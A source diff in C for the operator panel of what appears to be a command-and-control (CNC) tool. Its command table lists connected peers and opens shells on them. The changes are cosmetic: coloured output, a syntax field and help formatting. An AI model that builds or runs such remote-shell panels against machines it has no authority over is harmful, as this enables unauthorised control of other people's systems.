@@ -8,7 +8,7 @@
 #include "lerror.h"
 
 #define CMD_ERROR(...) do { \
-    shellT_printf("\r%s[~]%s ", shellT_getForeColor(TERM_BRIGHT_RED), shellT_getForeColor(TERM_BRIGHT_WHITE)); \
+    PRINTTAG(TERM_BRIGHT_RED); \
     shellT_printf(__VA_ARGS__); \
     longjmp(cmdE_err, 1); \
 } while(0);
@@ -107,14 +107,14 @@ void openShellCMD(tShell_client *client, int args, char *argc[]) {
 
 /* =============================================[[ Command Table ]]============================================== */
 
-#define CREATECMD(_cmd, _help, _callback) ((tShell_cmdDef){.cmd = _cmd, .help = _help, .callback = _callback})
+#define CREATECMD(_cmd, _syntax, _help, _callback) ((tShell_cmdDef){.cmd = _cmd, .syntax = _syntax, .help = _help, .callback = _callback})
 
 tShell_cmdDef shellS_cmds[] = {
-    CREATECMD("help", "Lists avaliable commands", helpCMD),
-    CREATECMD("quit", "Disconnects from CNC, closing panel", quitCMD),
-    CREATECMD("list", "Lists all connected peers to CNC", listPeersCMD),
-    CREATECMD("info", "Lists info on a peer", infoCMD),
-    CREATECMD("shell", "Opens a shell on peer", openShellCMD),
+    CREATECMD("help", "help", "Lists avaliable commands", helpCMD),
+    CREATECMD("quit", "quit", "Disconnects from CNC, closing panel", quitCMD),
+    CREATECMD("list", "list", "Lists all connected peers to CNC", listPeersCMD),
+    CREATECMD("info", "info [PEER_ID]", "Lists info on a peer", infoCMD),
+    CREATECMD("shell", "shell [PEER_ID]", "Opens a shell on peer", openShellCMD),
 };
 
 #undef CREATECMD
@@ -134,11 +134,10 @@ tShell_cmdDef *shellS_findCmd(char *cmd) {
 void helpCMD(tShell_client *client, int args, char *argc[]) {
     int i;
 
-    shellT_printf("\n\n=== [[ Command List ]] ===\n\n");
+    shellT_printf("======= [[ %sCommand List%s ]] =======\n", shellT_getForeColor(TERM_BRIGHT_YELLOW), shellT_getForeColor(TERM_BRIGHT_WHITE));
     for (i = 0; i < (sizeof(shellS_cmds)/sizeof(tShell_cmdDef)); i++) {
-        shellT_printf("%04d '%s'\t- %s\n", i, shellS_cmds[i].cmd, shellS_cmds[i].help);
+        shellT_printf("'%s%s%s'\t- %s\n", shellT_getForeColor(TERM_BRIGHT_YELLOW), shellS_cmds[i].syntax, shellT_getForeColor(TERM_BRIGHT_WHITE), shellS_cmds[i].help);
     }
-    shellT_printf("\n");
 }
 
 void shellS_initCmds(void) {
